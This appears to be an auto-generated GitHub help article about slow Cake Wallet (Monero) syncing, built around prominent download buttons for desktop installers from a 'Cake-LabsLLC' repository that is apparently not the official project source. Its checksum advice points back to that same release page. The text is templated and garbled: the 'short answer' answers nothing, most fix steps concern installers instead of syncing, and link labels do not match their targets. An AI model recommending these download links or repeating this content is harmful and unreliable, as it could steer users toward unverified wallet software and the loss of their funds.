<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Cake Wallet Sync Is Slow</h1>
<p align="center">A slow scan can be normal, especially when restoring a wallet from an earlier point in the Monero blockchain.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer
Cake Wallet takes a long time to sync

## You'll see this if
- Cake Wallet is a Monero (XMR) wallet, and a wallet needs to scan blockchain history to locate its transactions.
- You have checked the desktop release name but are uncertain what the warning or delay means.
- You want a safe next step without sharing sensitive wallet information.
- The issue continues after you close and reopen the app or revisit the release information.

## Why it happens
Restore height is the block height where scanning begins. An earlier height is safer when you are unsure, but it can make scanning slower because more history must be checked. A height that is too recent can omit older wallet activity from the scan. If you are restoring, consider whether the chosen height covers the time you first used the wallet. Sync speed can depend on the amount of history, connection quality, and the state of the local app. An app that appears idle may still be waiting on data or working through older blocks. Repeatedly stopping and restarting interrupts progress and makes it harder to tell whether the original scan was advancing.

Cake Wallet is a Monero (XMR) wallet, and a wallet needs to scan blockchain history to locate its transactions. The scan can take time; a restore that begins farther back generally has more history to examine. Give the app time and avoid repeatedly changing settings while a scan is in progress. Keep the distinction between a warning and a confirmed problem in mind. A warning calls for checking evidence; it is not a reason to ignore device safeguards. Likewise, a slow or failed launch does not by itself mean that funds are lost. Work from the simplest checks first and change one thing at a time, so you can identify whether the issue changes.

## Fix
1. **Pause and identify the exact situation.** Note the operating system, the message shown, whether the file is an installer, disk image, or archive, and whether the issue began before or after installation. Do not include a seed, keys, PIN, or private wallet information in notes you share.
2. **Check the source.** Use the project’s GitHub release page linked below. Compare the operating-system file name with the release listing. If you cannot confirm where the file came from, do not open it; remove it and obtain the release through the project source.
3. **Check the file’s integrity.** Compare its SHA-256 with the value shown on the GitHub release page. On Windows, a command prompt can use `certutil -hashfile <file> SHA256`; on macOS use `shasum -a 256 <file>`; on Linux use `sha256sum <file>`. Substitute the actual local file path. Compare the complete result carefully. Do not rely on a checksum copied from an unrelated message.
4. **Use the platform’s normal workflow.** On macOS, if the source and checksum have been confirmed and the message is the standard macOS block, right-click the app and choose Open. For Windows, do not disable SmartScreen; stop if you cannot confirm the source or checksum. On Linux, extract the ZIP completely and retain its folder structure. Do not run arbitrary shell commands from an unknown guide.
5. **Retry once after the check.** Close the warning or app, restart the normal launch process, and observe whether the message changes. Avoid repeated installation attempts from different sources, since that can introduce more uncertainty.
6. **If the issue involves restoring or scanning,** make sure you selected the appropriate restore path and seed format. A MyMonero seed may be 13 words (MyMonero-specific legacy) or 25 words (standard Monero). Newer wallets may use a different seed format; check the word count your backup shows. Restore height is the block height to start scanning. Earlier is safer when unsure, but slower.
7. **Protect your recovery details throughout.** Enter them only into the wallet recovery flow on your own device. Nobody legitimate asks for your seed. Do not send funds to another address as a diagnostic or recovery test.

> [!WARNING]
> Never bypass operating-system security just to make an installer open. Never provide a seed, keys, or PIN to a person or website claiming to troubleshoot the issue.

## If that did not work
Record the exact error text, the file type, and the checks you completed. A screenshot should not expose wallet balances, addresses, recovery words, or other private details. If the checksum differs from the release value, delete the file and do not run it. If the source cannot be established, treat the file as untrusted. If the checksum matches but the issue remains, preserve the release details and follow the project’s current support guidance from its repository rather than relying on unsolicited messages.

For a sync or restore concern, allow a reasonable scan interval and avoid repeatedly changing restore height. An earlier height may take longer, but choosing a later one can skip older activity. A sync that has not completed is different from proof that a transaction failed. If the problem is limited to opening the desktop app, first check that the download completed and that the package was handled in the normal way for your operating system.

Related troubleshooting: [Cake Wallet troubleshooting guide](./cake-wallet-not-syncing.md); [Cake Wallet download verification](./cake-wallet-restore-height.md); [Cake Wallet recovery steps](./cake-wallet-balance-zero.md); [Cake Wallet safety advice](./cake-wallet-transaction-not-showing.md); [Cake Wallet setup notes](./cake-wallet-restore-13-word-seed.md); [Cake Wallet FAQ](./cake-wallet-restore-25-word-seed.md)

> [!TIP]
> Make one change at a time and keep a private record of the release name and error. This makes it easier to retrace your steps without exposing recovery information.

---

## Prevention
- Obtain desktop files from the project release source and verify the SHA-256 value published there before opening a file.
- Keep operating-system security features enabled. A warning should prompt you to verify provenance and integrity, not to switch protection off.
- Keep the seed and keys private and stored securely. Do not include them in screenshots, support requests, or copied logs.
- Before restoring, identify whether your backup is the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows.
- Choose a restore height that covers the wallet’s activity. Earlier is safer if uncertain, while scanning more history takes longer.
- Treat unexpected support messages, requests for secrets, and instructions to move funds as suspicious. Nobody legitimate asks for your seed.

## FAQ
<details><summary>Can I share my seed to get help?</summary>

No. Never share your seed, keys, or PIN. A legitimate helper does not need them.

</details>

<details><summary>Does a warning prove the download is malicious?</summary>

Not by itself. Confirm the source, filename, and SHA-256 against the release information. If you cannot verify them, do not open the file.

</details>

<details><summary>Can I turn off security checks temporarily?</summary>

Do not disable security protections to run a file. Pause and establish that the download is the expected release before proceeding.

</details>

<details><summary>What if the wallet is still not working?</summary>

Keep the error details and the checks you performed, without recovery information. Consult current project guidance from the repository and avoid unsolicited troubleshooting offers.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Troubleshoot Cake Wallet not syncing | Cake Wallet](./cake-wallet-not-syncing.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Review node settings in Cake Wallet | Cake Wallet](./cake-wallet-node-settings.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Troubleshoot Cake Wallet desktop not opening | Cake Wallet](./cake-wallet-app-not-opening.md) | Practical, private steps for resolving this Cake Wallet question. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
